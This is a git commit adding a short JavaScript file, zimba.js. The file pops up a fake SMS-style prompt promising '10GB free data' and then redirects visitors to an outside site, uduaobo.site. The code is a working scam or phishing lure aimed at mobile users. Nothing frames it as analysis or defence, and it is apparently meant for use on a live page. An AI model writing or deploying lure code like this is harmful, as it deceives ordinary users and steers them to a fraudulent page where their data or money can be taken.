4ea102af4449d4d70176137dd88aa8638477b292
usorondo63 <descant-brevet0q@icloud.com>
2026-04-15 09:25:39 +0100

    Create zimba.js

---
+++ zimba.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS: Congratulation. Your Mobile Number is eligible to receive 10GB free data, kindly press Ok to select your network ','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://www.uduaobo.site/zw-10gb-independence-data';
+}
